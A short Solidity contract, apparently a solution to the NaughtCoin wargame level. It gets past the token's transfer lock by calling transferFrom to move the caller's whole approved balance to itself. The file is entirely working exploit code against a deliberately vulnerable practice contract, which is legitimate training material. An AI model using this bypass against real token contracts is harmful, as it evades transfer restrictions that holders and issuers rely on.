// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract HackNaughtCoin {

    constructor() public {}

    // Caller should approve this contract to transfer all tokens before calling this function
    function hack(address _naughtCoinAddr) external {
        (bool success, ) = _naughtCoinAddr.call(abi.encodeWithSignature(
            "transferFrom(address,address,uint256)",
            msg.sender,
            address(this),
            1000000 ether // Full balance of caller
        ));
        require(success, "HACK FAILED");
    }
}